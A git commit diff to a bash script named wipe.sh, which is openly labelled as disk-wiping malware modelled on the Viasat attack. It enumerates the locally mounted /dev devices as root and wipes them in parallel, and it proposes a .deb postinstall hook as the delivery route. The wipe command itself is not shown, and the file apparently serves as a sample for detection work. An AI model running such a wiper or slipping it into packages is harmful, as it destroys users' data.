446e5f6c051bc5ae9a6ace3dc0f96f5e76de1777
Thomas Stromberg <t+github@chainguard.dev>
2025-05-16 17:11:39 -0400

    wiper

--- wiper/wipe.sh
+++ wiper/wipe.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
-# Trashes all locally mounted disks.
+# Wipes all locally mounted disks, similar to Viasat attack [2022]
+#
+# Example deployment: .deb (apt package) postinstall,
+# similar to the FreeDownloadManager attack [2021]
 #
 # FOR THE LOVE OF GOD DO NOT RUN THIS OUTSIDE OF A VM
-
 if [[ "${UID}" == 0 ]]; then
+   # Wipe disks in parallel for fastest performance
    grep -E "^/dev" /proc/mounts \
      | cut -d" " -f1 \
      | sort -u \
@@ -11,4 +14,3 @@ if [[ "${UID}" == 0 ]]; then
 else
    echo "Have a great day!"
 fi
-
